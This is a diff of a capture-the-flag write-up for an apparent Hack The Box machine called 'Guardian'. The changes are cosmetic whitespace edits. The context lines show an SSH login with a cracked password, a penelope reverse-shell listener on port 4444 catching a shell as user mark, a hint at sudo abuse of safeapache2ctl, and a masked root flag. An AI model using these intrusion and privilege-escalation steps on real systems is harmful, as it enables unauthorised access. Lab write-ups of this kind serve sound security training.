@@ -761,13 +761,13 @@ So, we were able to crack the password for user jamil.enockson.
 Let's login as jamil via ssh, so that we can have interactive pty.
 
 ```bash
-ssh jamil@guardian.htb                                                                                                                          
+kali@kali:ssh jamil@guardian.htb
 The authenticity of host 'guardian.htb (10.129.237.248)' can't be established.
 ED25519 key fingerprint is: SHA256:yDuqpioi/UxJDaMuo7cAS4YDvpjykfPdRibqdx+QE9k
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added 'guardian.htb' (ED25519) to the list of known hosts.
-jamil@guardian.htb's password: 
+jamil@guardian.htb's password:
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)
 
 * Documentation:  https://help.ubuntu.com
@@ -792,7 +792,7 @@ The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
 Last login: Thu Feb 5 07:21:30 2026 from 10.10.16.26
-jamil@guardian:~$ 
+jamil@guardian:~$
 ```
 
 Our first flag is located at the home directory.
@@ -894,7 +894,7 @@ def system_status():
 Start a listener back on attacker machine.
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                                
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.56 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
@@ -908,16 +908,16 @@ jamil@guardian:/opt/scripts/utilities$ sudo -u mark /opt/scripts/utilities/utili
 We get a hit!!! Now, we are user mark.
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                                
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.56 • 172.17.0.1 • 172.18.0.1 • 10.10.16.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from guardian~10.129.237.248-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
-[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
 [+] Logging to /home/kali/.penelope/sessions/guardian~10.129.237.248-Linux-x86_64/2026_02_05-13_26_05-711.log 📜
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-mark@guardian:/opt/scripts/utilities$ 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+mark@guardian:/opt/scripts/utilities$
 ```
 
 Checking the sudo privileges, we can run /usr/local/bin/safeapache2ctl as root.
@@ -986,5 +986,6 @@ Let's conclude this very long challenge by reading the final flag at root direct
 bash-5.1# cat root.txt
 72.....52
 ```
+
 
 
